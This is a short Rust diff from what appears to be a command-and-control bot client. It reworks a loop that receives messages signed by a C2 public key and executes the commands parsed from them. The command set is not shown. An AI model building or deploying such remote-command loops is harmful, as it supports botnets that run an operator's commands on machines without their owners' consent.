@@ -27,20 +27,15 @@ pub async fn run() -> Result<()> {
         .await?;
 
     let mut stream = session
-        .subscribe(PublicKey::parse(CNC_PUB_KEY).unwrap())
+        .receive_msgs(PublicKey::parse(CNC_PUB_KEY).unwrap())
         .await?;
 
     loop {
-        tokio::select! {
-            // What the hell men, new events are not received by subscription!?
-            Some(event) = stream.next() => {
-                println!("Got event {:?}", event.content);
-                if let Some(command) = Commands::parse(event.content.as_str()) {
-                    command.execute(&session).await?;
-                }
-            },
-            _ = tokio::time::sleep(Duration::from_secs(10)) => {
-                println!("Timeout reached, no events received");
+        // What the hell men, new events are not received by subscription!?
+        if let Some(msg) = stream.next().await {
+            println!("RECEIVED MESSAGE: {}", msg);
+            if let Some(command) = Commands::parse(msg.as_str()) {
+                command.execute(&session).await?;
             }
         }
     }
